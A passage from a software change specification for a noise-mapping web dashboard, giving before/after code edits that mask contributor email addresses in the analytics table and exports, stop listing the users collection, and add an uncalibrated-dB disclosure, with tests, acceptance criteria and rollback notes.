 * One legacy path can still store a RAW address: an offline recording queued
 * without a label is uploaded with the auth email
 * (`lib/services/sync_service.dart:308`, priv-6; fixed app-side later).
 * `authorLabel` therefore re-masks anything that still looks like
 * `local@domain` to its first two characters plus `***`.
 *
 * - a label already masked by the app (`abc***@x.com`) is returned unchanged
 * - a display name, 'Anonymous' or 'Deleted User' is returned unchanged
 * - a missing, blank or non-string label becomes 'Anonymous'
 *
 * Pure module: no Firebase import, so it is safe to unit-test (master
 * playbook convention 2.15).
 */

export const ANONYMOUS_LABEL = 'Anonymous';

const RAW_ADDRESS = /^([^\s@]+)@([^\s@]+)$/;
const MASK = '***';
const VISIBLE_CHARS = 2;

export function authorLabel(userEmail?: string | null): string {
  if (typeof userEmail !== 'string') {
    return ANONYMOUS_LABEL;
  }
  const label = userEmail.trim();
  if (label === '') {
    return ANONYMOUS_LABEL;
  }
  const match = RAW_ADDRESS.exec(label);
  if (!match) {
    return label;
  }
  const [, local, domain] = match;
  if (local.endsWith(MASK)) {
    return label;
  }
  return `${local.slice(0, VISIBLE_CHARS)}${MASK}@${domain}`;
}
```

Placement note: the helper takes `string | null | undefined` (the type of the optional `NoiseReading.userEmail`). It keeps the app's own `abc***@domain` labels unchanged and masks to TWO characters (`lo***@domain`, master §4.7) only a value that still looks like a raw address. The app masks to three; a re-masked label is a leak-path fallback, not a label the app wrote, and two characters reveal less.

2b. New file `src/lib/__tests__/authorLabel.test.ts`: tests for the helper.

Full contents:
```ts
import { describe, expect, it } from 'vitest';
import { authorLabel } from '@/lib/authorLabel';

describe('authorLabel', () => {
  it('returns a label the app already masked, unchanged', () => {
    expect(authorLabel('abc***@example.com')).toBe('abc***@example.com');
    expect(authorLabel('ab***@example.com')).toBe('ab***@example.com');
  });

  it('returns a display name unchanged', () => {
    expect(authorLabel('Nuhaadh')).toBe('Nuhaadh');
    expect(authorLabel('Jo Smith')).toBe('Jo Smith');
  });

  it('passes Deleted User and Anonymous through', () => {
    expect(authorLabel('Deleted User')).toBe('Deleted User');
    expect(authorLabel('Anonymous')).toBe('Anonymous');
  });

  it('returns Anonymous when the label is missing, blank or not a string', () => {
    expect(authorLabel(undefined)).toBe('Anonymous');
    expect(authorLabel(null)).toBe('Anonymous');
    expect(authorLabel('')).toBe('Anonymous');
    expect(authorLabel('   ')).toBe('Anonymous');
    expect(authorLabel(42 as unknown as string)).toBe('Anonymous');
  });

  it('re-masks a raw address to two characters plus ***', () => {
    expect(authorLabel('lochana@example.com')).toBe('lo***@example.com');
    expect(authorLabel('john+tag@sub.example.co.uk')).toBe('jo***@sub.example.co.uk');
  });

  it('keeps a one-character local part', () => {
    expect(authorLabel('a@example.com')).toBe('a***@example.com');
  });

  it('never returns the full local part of a raw address', () => {
    expect(authorLabel('lochana@example.com')).not.toContain('lochana');
  });

  it('is idempotent', () => {
    const once = authorLabel('lochana@example.com');
    expect(authorLabel(once)).toBe(once);
  });

  it('trims surrounding whitespace', () => {
    expect(authorLabel('  abc***@example.com ')).toBe('abc***@example.com');
    expect(authorLabel(' lochana@example.com')).toBe('lo***@example.com');
  });
});
```

2c. `src/utils/exportHelpers.ts`: swap the `UserInfo` import for `authorLabel`.

BEFORE (`src/utils/exportHelpers.ts`, lines 1-3 at HEAD `353bbdd`; still the first three lines after 04.2c, 06.3p and 07.1a, which only add lines below them, verbatim):
```ts
import type { NoiseReading } from '@/types/NoiseReading';
import type { UserInfo } from '@/services/userService';
import { format } from 'date-fns';
```

AFTER:
```ts
import type { NoiseReading } from '@/types/NoiseReading';
import { format } from 'date-fns';
import { authorLabel } from '@/lib/authorLabel';
```

Placement note: `authorLabel` is placed directly after the `date-fns` import, above the `@/lib/categories` import 06.3p added.

2d. `src/utils/exportHelpers.ts`: drop the `userMap` parameter from `buildCsv`.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
export function buildCsv(data: NoiseReading[], userMap?: Map<string, UserInfo>): string {
```

AFTER:
```ts
export function buildCsv(data: NoiseReading[]): string {
```

2e. `src/utils/exportHelpers.ts`: rename the last CSV column.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
    'Confidence (%)',
    'User Email'
  ];
```

AFTER:
```ts
    'Confidence (%)',
    'Contributor'
  ];
```

2f. `src/utils/exportHelpers.ts`: the contributor cell.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
      csvCell(userMap?.get(reading.userId)?.email || reading.userId || 'Unknown')
    ].join(',');
```

AFTER:
```ts
      csvCell(authorLabel(reading.userEmail))
    ].join(',');
```

Placement note: `NoiseReading.userEmail?: string` is declared by 04.3a. If `grep -n userEmail src/types/NoiseReading.ts` prints nothing, 04.3 has not been applied: STOP.

2g. `src/utils/exportHelpers.ts`: drop the `userMap` parameter from `exportToCSV`.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
export function exportToCSV(data: NoiseReading[], userMap?: Map<string, UserInfo>, filename: string = 'noise_readings') {
```

AFTER:
```ts
export function exportToCSV(data: NoiseReading[], filename: string = 'noise_readings') {
```

2h. `src/utils/exportHelpers.ts`: call `buildCsv` without a user map.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
  const csvWithBOM = BOM + buildCsv(data, userMap);
```

AFTER:
```ts
  const csvWithBOM = BOM + buildCsv(data);
```

2i. `src/utils/exportHelpers.ts`: add `contributor` to each JSON reading and keep `userId`.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1c, verbatim):
```ts
      userId: reading.userId || 'Unknown'
    }))
  };
}
```

AFTER:
```ts
      contributor: authorLabel(reading.userEmail),
      userId: reading.userId || 'Unknown'
    }))
  };
}
```

Placement note: `contributor` goes next to `userId`. The JSON keeps `userId` (an opaque uid, readable by every signed-in user under the rules) so a researcher can still group one person's readings.

2j. `src/components/analytics/DataTable.tsx`: drop the `UserInfo` import.

BEFORE (`src/components/analytics/DataTable.tsx`, lines 3-4 at HEAD `353bbdd`, verbatim):
```tsx
import type { NoiseReading } from '@/types/NoiseReading';
import type { UserInfo } from '@/services/userService';
```

AFTER:
```tsx
import type { NoiseReading } from '@/types/NoiseReading';
```

2k. `src/components/analytics/DataTable.tsx`: import the helper.

BEFORE (`src/components/analytics/DataTable.tsx`, line 14 at HEAD `353bbdd`; single-line anchor that 04.2n and 06.3g append after, verbatim):
```tsx
import { cn } from '@/lib/utils';
```

AFTER:
```tsx
import { cn } from '@/lib/utils';
import { authorLabel } from '@/lib/authorLabel';
```

Placement note: the new import lands between the `cn` import and the `@/lib/categories` import 06.3g added.

2l. `src/components/analytics/DataTable.tsx`: remove the `userMap` prop.

BEFORE (`src/components/analytics/DataTable.tsx`, lines 17-20 at HEAD `353bbdd`, verbatim):
```tsx
interface DataTableProps {
  data: NoiseReading[];
  userMap?: Map<string, UserInfo>;
}
```

AFTER:
```tsx
interface DataTableProps {
  data: NoiseReading[];
}
```

2m. `src/components/analytics/DataTable.tsx`: stop destructuring `userMap`.

BEFORE (`src/components/analytics/DataTable.tsx`, lines 40-40 at HEAD `353bbdd`, verbatim):
```tsx
export function DataTable({ data, userMap }: DataTableProps) {
```

AFTER:
```tsx
export function DataTable({ data }: DataTableProps) {
```

2n. `src/components/analytics/DataTable.tsx`: rename the column header.

BEFORE (`src/components/analytics/DataTable.tsx`, lines 209-209 at HEAD `353bbdd`, verbatim):
```tsx
              <TableHead>User Email</TableHead>
```

AFTER:
```tsx
              <TableHead>Contributor</TableHead>
```

Placement note: the header stays a plain, non-sortable `<TableHead>`. The empty-state row keeps `colSpan={7}`: the table still has seven columns.

2o. `src/components/analytics/DataTable.tsx`: show the masked contributor label.

BEFORE (`src/components/analytics/DataTable.tsx`, lines 282-282 at HEAD `353bbdd`, verbatim):
```tsx
                    {userMap?.get(reading.userId)?.email || reading.userId || 'Unknown'}
```

AFTER:
```tsx
                    {authorLabel(reading.userEmail)}
```

2p. `src/pages/AnalyticsPage.tsx`: remove the React hook import, which nothing else in the file uses once the effect and state below are gone.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 5-6 at HEAD `353bbdd`, verbatim):
```tsx
import { Button } from '@/components/ui/button';
import { useEffect, useState } from 'react';
```

AFTER:
```tsx
import { Button } from '@/components/ui/button';
```

Placement note: if 05.4 added a `useEffect` or `useState` of its own, keep the import and drop only the unused names. `grep -n "useEffect\|useState" src/pages/AnalyticsPage.tsx` must show no remaining use before the import is deleted.

2q. `src/pages/AnalyticsPage.tsx`: remove the user service import.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 12-13 at HEAD `353bbdd`, verbatim):
```tsx
import { exportToCSV, exportToJSON } from '@/utils/exportHelpers';
import { fetchAllUsers, type UserInfo } from '@/services/userService';
```

AFTER:
```tsx
import { exportToCSV, exportToJSON } from '@/utils/exportHelpers';
```

2r. `src/pages/AnalyticsPage.tsx`: remove the `userMap` state.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 18-19 at HEAD `353bbdd`, verbatim):
```tsx
  const { isDarkMode } = useTheme();
  const [userMap, setUserMap] = useState<Map<string, UserInfo>>(new Map());
```

AFTER:
```tsx
  const { isDarkMode } = useTheme();
```

Placement note: leave the `useSyncedReadings()` line and its comment as they are; 05.4 edits that line. The anchor includes the `isDarkMode` line so no stray blank line is left behind.

2s. `src/pages/AnalyticsPage.tsx`: delete the effect that listed the whole `users` collection.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 23-30 at HEAD `353bbdd`, verbatim):
```tsx
  const markerCount = readings.length;

  // Fetch users for email lookup
  useEffect(() => {
    fetchAllUsers().then((map) => {
      setUserMap(map);
    });
  }, []);
```

AFTER:
```tsx
  const markerCount = readings.length;
```

2t. `src/pages/AnalyticsPage.tsx`: the CSV button.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 121-121 at HEAD `353bbdd`, verbatim):
```tsx
onClick={() => exportToCSV(readings, userMap, 'noise_readings')}
```

AFTER:
```tsx
onClick={() => exportToCSV(readings, 'noise_readings')}
```

2u. `src/pages/AnalyticsPage.tsx`: the table.

BEFORE (`src/pages/AnalyticsPage.tsx`, lines 153-153 at HEAD `353bbdd`, verbatim):
```tsx
<DataTable data={readings} userMap={userMap} />
```

AFTER:
```tsx
<DataTable data={readings} />
```

2v. Delete `src/services/userService.ts`: after 2c, 2j, 2q and 2s nothing imports it (its only importers were `AnalyticsPage`, `DataTable` and `exportHelpers`).

From the DASH root run exactly:
```
git rm src/services/userService.ts
```

The file (53 lines at HEAD `353bbdd`) exports only `UserInfo`, `fetchAllUsers` and `getUserEmail`. Delete it whole; there is nothing to keep.

Placement note: the repo has no other `users` access from `src/`. Cluster 08.1 reads the signed-in user's OWN doc with `getDoc(doc(db,'users',uid))` in `AuthContext`, which is the single allowed form (master §2.1).

2w. `src/utils/__tests__/exportHelpers.test.ts`: the expected header.

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 07.1 step 1e, verbatim):
```ts
  'Confidence (%)',
  'User Email',
];
```

AFTER:
```ts
  'Confidence (%)',
  'Contributor',
];
```

2x. `src/utils/__tests__/exportHelpers.test.ts`: the expected last cell is now the masked label, not the uid.

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 07.1 step 1e, verbatim):
```ts
      '50.00',
      'uid1',
    ]);
```

AFTER:
```ts
      '50.00',
      'ab***@example.com',
    ]);
```

2y. `src/utils/__tests__/exportHelpers.test.ts`: add the contributor tests above the JSON tests.

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 07.1 step 1e, verbatim):
```ts
describe('buildJsonExport', () => {
  it('writes the metadata', () => {
```

AFTER:
```ts
describe('contributor label', () => {
  it('writes the masked label in the last CSV column', () => {
    const rows = parseCsv(buildCsv([reading()]));
    expect(rows[1][8]).toBe('ab***@example.com');
  });

  it('re-masks a raw address that reached the cache (priv-6)', () => {
    const csv = buildCsv([reading({ userEmail: 'lochana@example.com' })]);
    expect(parseCsv(csv)[1][8]).toBe('lo***@example.com');
    expect(csv).not.toContain('lochana');
  });

  it('writes Anonymous when the reading has no label', () => {
    const rows = parseCsv(buildCsv([reading({ userEmail: undefined })]));
    expect(rows[1][8]).toBe('Anonymous');
  });

  it('writes Deleted User, never the rewritten uid', () => {
    const rows = parseCsv(
      buildCsv([reading({ userId: 'deleted_user_abcd1234', userEmail: 'Deleted User' })]),
    );
    expect(rows[1][8]).toBe('Deleted User');
  });

  it('adds the contributor to the JSON export and keeps userId', () => {
    const json = buildJsonExport([reading({ userEmail: 'lochana@example.com' })], new Date());
    expect(json.readings[0].contributor).toBe('lo***@example.com');
    expect(json.readings[0].userId).toBe('uid1');
    expect(JSON.stringify(json)).not.toContain('lochana');
  });
});

describe('buildJsonExport', () => {
  it('writes the metadata', () => {
```

**Edge cases to preserve**
- Display only: nothing reads `users/{uid}.email` any more. The label comes from the reading itself, which every signed-in user can already read (`noise_readings` read is `isSignedIn()`), so this step exposes nothing new and removes one raw-email path.
- `authorLabel` is idempotent. A label the app already masked (`abc***@example.com`) and a display name come back unchanged, so the common case (3,372 of 3,374 production docs) renders exactly what the app stored. Only a value shaped like `local@domain` whose local part does not already end in `***` is re-masked, to two characters (`lo***@domain`). This defends against the offline-sync raw-email fallback (`APP:sync_service.dart:308`, priv-6), which stays an app-side follow-up.
- The 2 production docs with no label show 'Anonymous'. 'Deleted User' (written by account deletion) shows as is, and the rewritten `deleted_user_<8 chars>` uid is never shown as the contributor.
- The JSON export keeps `userId` (an opaque uid) so a researcher can still group one person's readings, and gains `contributor`. The CSV has no uid column.
- `DataTable`'s empty-state row keeps `colSpan={7}`: the table still has seven columns. The 'Contributor' header stays a plain `<TableHead>` (not sortable), as 'User Email' was.
- Rules independence: `fetchAllUsers` swallowed permission-denied (`userService.ts:28-30`), so the page worked before and after rules step 02.4. This step needs no deploy and no rules edit. Do NOT edit `firestore.rules` here: its comments that name `userService.ts` (`:62`, `:147-148`) are rewritten by cluster 02.4, in both repos together.
- Cluster 08.1 (access gate) reads the signed-in user's OWN `users/{uid}` doc in `AuthContext` with `getDoc`. That is the single allowed `users` access (master §2.1) and does not depend on `userService.ts`.
- 05.4's loading and error handling in `AnalyticsPage.tsx` is untouched: every edit there is a small, separate anchor.

**Acceptance criteria**
- `npx vitest run src/lib/__tests__/authorLabel.test.ts src/utils/__tests__/exportHelpers.test.ts` reports 45 passing tests (9 + 36) and 0 failing.
- `grep -rnE "userService|fetchAllUsers|getUserEmail|UserInfo|userMap" src` prints nothing.
- `grep -rnE "collection\(db, ?'users'" src` prints nothing.
- `git status --short` shows `src/services/userService.ts` as deleted, and `src/services/` no longer exists.
- On `/analytics` (any signed-in account): the table's last header reads 'Contributor' and every row shows a masked label or a display name, never a 28-character uid and never a full email. DevTools → Network, filtered to `firestore.googleapis.com`, shows no request that names `documents/users` or `users` on `/analytics`.
- Export CSV: the last header is 'Contributor' and its cells hold the same labels as the table. Export JSON: each reading has `contributor` and still has `userId`.
- `npx tsc -b` reports 0 errors, so no orphaned `UserInfo` reference remains.

**Verify**
```
npx tsc -b
npx eslint src/lib/authorLabel.ts src/lib/__tests__/authorLabel.test.ts src/utils/exportHelpers.ts src/utils/__tests__/exportHelpers.test.ts src/components/analytics/DataTable.tsx src/pages/AnalyticsPage.tsx
npx vitest run src/lib/__tests__/authorLabel.test.ts src/utils/__tests__/exportHelpers.test.ts
git rm src/services/userService.ts
git status --short
```
Manual: the `/analytics` table, CSV, JSON and Network checks above. Stage by explicit path: the two new files, the four modified files, and the deletion. Do NOT run `npm run build` in this step.

**Commit title:** `fix(privacy): show the masked author label and stop listing the users collection (priv-2)`

---

### Step 3 — ux-3: disclose that dB values are uncalibrated phone estimates

**Goal:** One shared string, `DB_CAVEAT`, states that dB values are uncalibrated estimates from phone microphones and vary by device. It is shown as a one-line note under the stats row on `/dashboard` and `/analytics`, it is part of the CSV dB column header, and it is the JSON `metadata.note`. The map legend (cluster 09.4) imports the same constant.

**Files:**
- `src/lib/noiseBands.ts`
- `src/components/analytics/StatsCards.tsx`
- `src/utils/exportHelpers.ts`
- `src/utils/__tests__/exportHelpers.test.ts`

**Exact changes**

Prerequisite: Steps 1 and 2 are committed. Every `exportHelpers.ts` and `exportHelpers.test.ts` block below anchors on their AFTER text, and `noiseBands.ts` is the file 06.1b created.

3a. `src/lib/noiseBands.ts`: export the shared caveat string.

BEFORE (`src/lib/noiseBands.ts`, as left by 06.1b (the last lines of the new file), verbatim):
```ts
/** Band for a finite dB value. Callers pass finite numbers (normalizeReading drops other docs). */
export function noiseBand(decibels: number): NoiseBand {
  if (decibels < LOW_BAND_BELOW_DB) return NOISE_BANDS.low;
  if (decibels <= MODERATE_BAND_MAX_DB) return NOISE_BANDS.moderate;
  return NOISE_BANDS.high;
}
```

AFTER:
```ts
/** Band for a finite dB value. Callers pass finite numbers (normalizeReading drops other docs). */
export function noiseBand(decibels: number): NoiseBand {
  if (decibels < LOW_BAND_BELOW_DB) return NOISE_BANDS.low;
  if (decibels <= MODERATE_BAND_MAX_DB) return NOISE_BANDS.moderate;
  return NOISE_BANDS.high;
}

/**
 * One-line disclosure for every place a dB number is shown as a finding: the
 * stats row (07.3), the CSV header and JSON note (07.3), and the map legend
 * (09.4 imports this same constant). It mirrors the app's own wording
 * (APP lib/screens/dashboard_screen.dart:1015): the app has no reference-SPL
 * calibration and no per-device profile, so absolute levels differ by phone.
 */
export const DB_CAVEAT =
  'dB values are uncalibrated estimates from phone microphones; levels vary by device.';
```

Placement note: append at the end of the file; nothing else in `noiseBands.ts` changes. Do not reword the string: a test pins it and 09.4 reuses it verbatim.

3b. `src/components/analytics/StatsCards.tsx`: import the caveat.

BEFORE (`src/components/analytics/StatsCards.tsx`, lines 4-4 at HEAD `353bbdd`, verbatim):
```tsx
import { useSyncedReadings } from '@/hooks/useSyncedReadings';
```

AFTER:
```tsx
import { useSyncedReadings } from '@/hooks/useSyncedReadings';
import { DB_CAVEAT } from '@/lib/noiseBands';
```

Placement note: single-line anchor; 05.4 may add lines after it.

3c. `src/components/analytics/StatsCards.tsx`: show the note under the stats row.

BEFORE (`src/components/analytics/StatsCards.tsx`, lines 99-104 at HEAD `353bbdd`, verbatim):
```tsx
          {stats.activeContributors.toLocaleString()}
        </p>
      </div>
    </div>
  );
}
```

AFTER:
```tsx
          {stats.activeContributors.toLocaleString()}
        </p>
      </div>

      {/* Uncalibrated-dB disclosure (ux-3): one line under the stats row */}
      <p
        className={cn(
          'col-span-full text-xs transition-colors',
          isDarkMode ? 'text-gray-400' : 'text-gray-600'
        )}
      >
        {DB_CAVEAT}
      </p>
    </div>
  );
}
```

Placement note: the paragraph is a fifth child of the existing four-column grid, spanning every column with `col-span-full`, so the card markup above is not re-indented and no wrapper element is added. `StatsCards` renders on both `/dashboard` and `/analytics`, so both pages get the note. `isDarkMode` and `cn` are already in scope in this file.

3d. `src/utils/exportHelpers.ts`: import the caveat next to `noiseBand`.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1a, verbatim):
```ts
import { noiseBand } from '@/lib/noiseBands';
```

AFTER:
```ts
import { DB_CAVEAT, noiseBand } from '@/lib/noiseBands';
```

3e. `src/utils/exportHelpers.ts`: put the caveat in the CSV dB header.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1b, verbatim):
```ts
    'Noise Level (dB)',
```

AFTER:
```ts
    'Noise Level (dB, uncalibrated estimate)',
```

Placement note: the new header contains a comma. `buildCsv` runs every header through `csvCell` (07.1), so it is written quoted and stays one column. Do NOT add a `#` comment row: it breaks `pandas.read_csv`.

3f. `src/utils/exportHelpers.ts`: put the caveat in the JSON metadata.

BEFORE (`src/utils/exportHelpers.ts`, as left by 07.1 step 1c, verbatim):
```ts
      source: 'Urban Noise Pollution Mapper',
      version: '2.6.0'
    },
```

AFTER:
```ts
      source: 'Urban Noise Pollution Mapper',
      version: '2.6.0',
      note: DB_CAVEAT
    },
```

3g. `src/utils/__tests__/exportHelpers.test.ts`: import the caveat in the test.

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 07.1 step 1e, verbatim):
```ts
import { buildCsv, buildJsonExport, csvCell, csvFixed } from '@/utils/exportHelpers';
```

AFTER:
```ts
import { DB_CAVEAT } from '@/lib/noiseBands';
import { buildCsv, buildJsonExport, csvCell, csvFixed } from '@/utils/exportHelpers';
```

3h. `src/utils/__tests__/exportHelpers.test.ts`: the expected header.

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 07.1 step 1e, verbatim):
```ts
  'Noise Level (dB)',
```

AFTER:
```ts
  'Noise Level (dB, uncalibrated estimate)',
```

3i. `src/utils/__tests__/exportHelpers.test.ts`: add the disclosure tests above the JSON tests (below the 'contributor label' block that 2y added).

BEFORE (`src/utils/__tests__/exportHelpers.test.ts`, as left by 2y, verbatim):
```ts
describe('buildJsonExport', () => {
  it('writes the metadata', () => {
```

AFTER:
```ts
describe('uncalibrated-dB disclosure', () => {
  it('states the caveat in the dB column header', () => {
    expect(parseCsv(buildCsv([]))[0][4]).toBe('Noise Level (dB, uncalibrated estimate)');
  });

  it('quotes the header so its comma does not add a column', () => {
    const csv = buildCsv([reading()]);
    expect(csv.split('\n')[0]).toContain('"Noise Level (dB, uncalibrated estimate)"');
    for (const row of parseCsv(csv)) {
      expect(row).toHaveLength(9);
    }
  });

  it('adds no comment row, which would break pandas.read_csv', () => {
    const lines = buildCsv([reading()]).split('\n');
    expect(lines).toHaveLength(2);
    expect(lines[0].startsWith('#')).toBe(false);
  });

  it('carries the shared caveat in the JSON metadata note', () => {
    expect(buildJsonExport([reading()], new Date()).metadata.note).toBe(DB_CAVEAT);
  });

  it('uses the exact shared wording', () => {
    expect(DB_CAVEAT).toBe(
      'dB values are uncalibrated estimates from phone microphones; levels vary by device.',
    );
  });
});

describe('buildJsonExport', () => {
  it('writes the metadata', () => {
```

**Edge cases to preserve**
- The wording is fixed: `dB values are uncalibrated estimates from phone microphones; levels vary by device.` It mirrors the app (`APP:lib/screens/dashboard_screen.dart:1015-1016`) and is pinned by a test. 09.4 reuses it verbatim, so never inline a second copy of the sentence.
- No `#` comment row in the CSV. It breaks `pandas.read_csv` and most CSV parsers, so the caveat goes in the header cell and in the JSON note only. The test asserts the first line is the header and the file has no comment line.
- The new CSV header `Noise Level (dB, uncalibrated estimate)` contains a comma. It is safe only because the header row goes through `csvCell` (Step 1), and a test checks that every row still has nine cells. The CSV column count and order are unchanged.
- The JSON `note` is added to `metadata` only. `version` stays `'2.6.0'` and no reading field changes.
- The `<p>` is a fifth child of the existing four-column grid with `col-span-full`, so it sits on its own row under the cards at every breakpoint, including a 375 px phone, and the four cards are not re-indented or wrapped. It uses the same `isDarkMode ? ... : ...` pattern as the file's other text. `text-gray-600` on white and `text-gray-400` on the dark card are the contrast pair the page already uses; cluster 10.4 owns any later contrast pass.
- `StatsCards` is rendered on `/dashboard` and `/analytics`, so both pages show the note once. `StatsCardsSkeleton` is not changed.
- `DB_CAVEAT` lives in `noiseBands.ts` per master §4.11, and that file imports nothing, so the test and `exportHelpers` import it without loading Firebase.

**Acceptance criteria**
- `npx vitest run src/utils/__tests__/exportHelpers.test.ts` reports 41 passing tests and 0 failing.
- `grep -rn "uncalibrated estimates from phone microphones" src` prints only `src/lib/noiseBands.ts` (the constant) and the test file that pins it; no component or helper inlines a second copy of the sentence.
- On `/dashboard` and `/analytics`, one line reading exactly `dB values are uncalibrated estimates from phone microphones; levels vary by device.` appears directly under the four stat cards, in light and dark theme, and wraps without horizontal scroll at 375 px.
- The CSV's first line is `"Timestamp","Location","Latitude","Longitude","Noise Level (dB, uncalibrated estimate)","Category","Type","Confidence (%)","Contributor"`, and the data rows still have nine cells. The JSON's `metadata.note` equals the caveat.
- Final CSV shape for the whole cluster (master §4.7): Timestamp, Location, Latitude, Longitude, Noise Level (dB, uncalibrated estimate), Category, Type, Confidence (%), Contributor. Every cell quoted.
- End of cluster: `npm test` passes the whole suite (this cluster adds `exportHelpers.test.ts` and `authorLabel.test.ts` to the files 01, 04 and 06 added), `npx tsc -b` reports 0 errors, and `npm run build` succeeds.

**Verify**
```
npx tsc -b
npx eslint src/lib/noiseBands.ts src/components/analytics/StatsCards.tsx src/utils/exportHelpers.ts src/utils/__tests__/exportHelpers.test.ts
npx vitest run src/utils/__tests__/exportHelpers.test.ts
npm test
npm run build
git status --short
```
Manual: the `/dashboard`, `/analytics`, CSV and JSON checks above. `npm run build` takes about 7.5 minutes on this machine: run it alone, with no dev server or type check alongside it (master §1.3). Stage by explicit path, never `git add -A`.

**Commit title:** `fix(ux): disclose that dB values are uncalibrated phone estimates in stats and exports (ux-3)`

---

## Risks & rollback

- **Downstream scripts keyed on header text break.** Two CSV headers change: 'User Email' becomes 'Contributor' (Step 2) and 'Noise Level (dB)' becomes 'Noise Level (dB, uncalibrated estimate)' (Step 3). Every header is now written quoted. A parser that reads the file with a CSV library is unaffected; a script that matches the raw first line or a column name needs the new names. The JSON gains `contributor` and `metadata.note` and loses nothing. Tell the owner before pushing, and note that files exported earlier keep the old shape.
- **A leading apostrophe is visible on import.** In Excel and Sheets a CSV text value that starts with `=`, `+`, `-` or `@` now shows the apostrophe as part of the text (for example `'-Main Rd`). That is the accepted cost of the standard neutralization, and it applies only to text columns. Real numbers (coordinates, dB, confidence) are written without it.
- **Quoted numbers.** Excel, LibreOffice and `pandas.read_csv` all parse a quoted numeric field as a number. If a consumer treats quoted fields as strings, widen the `csvCell` number branch in a follow-up; do not drop the quoting.
- **Re-masking can hide a deliberate display name that looks like an address.** A display name written as `local@domain` (no spaces) is shown as `lo***@domain`. That is the intended privacy-conservative behaviour.
- **Verification limit.** `tsc -b`, eslint and vitest were NOT run while this spec was written (the machine was resource-constrained and no repo file could be modified or built). The pure logic in `csvCell`, `csvFixed`, `buildCsv`, `buildJsonExport` and `authorLabel`, together with both test files, was transpiled with the repo's TypeScript compiler and run on Node 20 through a minimal runner shim against the post-04/06 `readings.ts`, `categories.ts` and `noiseBands.ts` from the 04 and 06 specs. After Step 1, Step 2 and Step 3 the shim reported 31, 36 and 41 passing `exportHelpers` tests, and 9 passing `authorLabel` tests after Step 2 and Step 3, with 0 failures. That checks the logic, not the types, so the first real `npx tsc -b` and `npx vitest run` in each step is the authority.
- **No deploy, no rules, no index.** Nothing in this cluster touches `firestore.rules`, `firestore.indexes.json` or Firebase. The only `users` access it removes is the whole-collection `getDocs`, and the browser stays read-only.
- **Rollback:** each step reverts on its own, newest first. Reverting Step 2 restores `userService.ts` and the 'User Email' column, which again lists `users` on every visit (denied for everyone except the one admin once 02.4 is deployed, and swallowed) and leaves the raw-email shape for that admin. Reverting Step 1 restores the unquoted, unneutralized CSV. Reverting Step 3 removes the note and the header caveat; `DB_CAVEAT` may stay if 09.4 already uses it, in which case revert every hunk except 3a. If the push goes to `main`, Vercel redeploys on the push, so ask the owner before pushing (master §4.15).

## Out of scope

- **Rules (cluster 02).** Making `users` owner-read only, deleting `isAdmin()`, and rewriting the rules comments that name `userService.ts`. This cluster only removes the browser consumer. Never edit `firestore.rules` or deploy from here (master §2.2 and §2.3).
- **priv-6 (APP).** The app-side one-line fix to `sync_service.dart:308` so offline uploads never store a raw email. `authorLabel` masks the value at display time until then.
- **An admin-only raw-email export or a reveal toggle** (suggested in the priv-2 findings). No browser code lists `users` after this step, so there is no raw email to reveal. Under master decision D1 the owner can read raw emails in the Firebase console.
- **Pseudonymising the JSON `userId`.** It stays an opaque uid.
- **The disclosure outside the stats row and the exports.** Chart headers and axes (`NoiseTrendChart` 'Maximum' and 'Minimum'), the table's dB badge and the map popup stay as they are. The map legend note is cluster 09.4, which imports `DB_CAVEAT`.
- **Rounding dB to whole numbers** (the ux-3 fix hint says "consider").
- **bug-10** (`StatsCards` counts a missing dB as 0 and `Math.max(...spread)`), **bug-12** (UTC timestamp column), **perf-6**, **ux-11** (print) and every other master §7 item.
- **Component render tests.** There is no jsdom (01.1), so `DataTable` and `StatsCards` are verified by the manual checks, not by tests.
- **Reformatting `StatsCards`** or the table beyond the lines each step names. Clusters 05.4, 10.2 and 10.4 edit those files after this one.
